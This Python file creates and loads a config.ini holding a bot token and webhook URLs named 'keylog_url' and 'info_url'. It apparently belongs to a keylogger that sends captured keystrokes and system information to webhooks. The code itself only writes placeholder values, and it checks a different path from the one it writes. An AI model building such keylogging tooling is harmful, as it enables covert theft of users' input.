from configparser import ConfigParser
import os
config = ConfigParser()

config_file_exists = os.path.exists('../config.ini')

config.read('../config.ini')

def CreateConfig():
	config.add_section('bot')
	config.add_section('webhook')

	config.set('bot', 'token', 'None')
	config.set('webhook', 'keylog_url', 'None')
	config.set('webhook', 'info_url', 'None')

	with open('config.ini', 'w') as configfile:
		config.write(configfile)
	print('Created config.ini, please config in config.ini file.')
	os._exit(0)

def LoadsConfig():
	CreateConfig() if not config_file_exists else None

	return config